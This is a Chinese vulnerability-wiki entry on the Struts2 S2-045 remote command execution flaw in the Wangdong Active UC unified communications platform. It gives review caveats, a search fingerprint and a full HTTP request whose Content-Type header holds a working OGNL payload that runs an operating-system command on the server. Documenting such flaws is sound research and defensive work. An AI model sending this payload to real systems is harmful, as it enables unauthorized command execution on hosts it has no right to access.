---
source: "Threekiii/Vulnerability-Wiki"
title: "网动Active UC/Struts2 index.action S2-045命令执行"
product: "网动Active UC/Struts2"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: "S2-045"
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "Struts2 multipart OGNL前提；ActiveUC版本未知"
prerequisites: "请求含SessionId"
side_effects: "命令/代码执行示例可能改变主机状态"
review_date: "2026-10-02"
identifier_role: "primary"
source_url: "https://github.com/Threekiii/Vulnerability-Wiki"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/Active%20UC/Active-UC-index.action-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md"
id: "vw-d33c63b51866d5f655f98501"
entity_id: "ve-d33c63b51866d5f655f98501"
schema_version: "1"
canonical: "Web安全/商业软件/Active UC/Active-UC-index.action-远程命令执行漏洞.md"
---

# 网动Active UC/Struts2 index.action S2-045命令执行

## 条目说明

- 对象与具体问题：网动Active UC/Struts2；index.action S2-045命令执行
- 版本、配置及部署条件：Struts2 multipart OGNL前提；ActiveUC版本未知
- 认证与权限前提：请求含SessionId
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 主问题为底层Struts公告S2-045，产品文章保留版本映射不能推全部UC受影响
- 请求multipart无终止--，Charsert错拼，Host空；认证前提未解释
- 缺组件版本与固定版本及修复来源；默认cmd=dir平台相关

## 操作风险

命令/代码执行示例可能改变主机状态。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

### 漏洞描述

网动统一通信平台 Active UC index.action 存在S2-045远程命令执行漏洞, 通过漏洞可以执行任意命令

### 漏洞影响

```
Active UC
```

### 网络测绘

```
title="网动统一通信平台(Active UC)"
```

### 漏洞复现

登录页面如下

![](./.resource/Active-UC-index.action-远程命令执行漏洞/media/202202101923695.png)



发送如下请求包

```http
POST /acenter/index.action HTTP/1.1
Cookie: SessionId=96F3F15432E0660E0654B1CE240C4C36
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)
Charsert: UTF-8
Content-Type: %{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='dir').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}; boundary=---------------------------18012721719170
Cache-Control: no-cache
Pragma: no-cache
Host: 
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: keep-alive

-----------------------------18012721719170
Content-Disposition: form-data; name="pocfile"; filename="text.txt"
Content-Type: text/plain

xxxxxxx
-----------------------------18012721719170
```

> 请求长度说明：原资料 Content-Length 为 196；静态长度已移除，应由客户端根据最终请求体的字节数生成。

![](./.resource/Active-UC-index.action-远程命令执行漏洞/media/202202101923511.png)

---

> 来源：Threekiii/Vulnerability-Wiki（https://github.com/Threekiii/Vulnerability-Wiki）
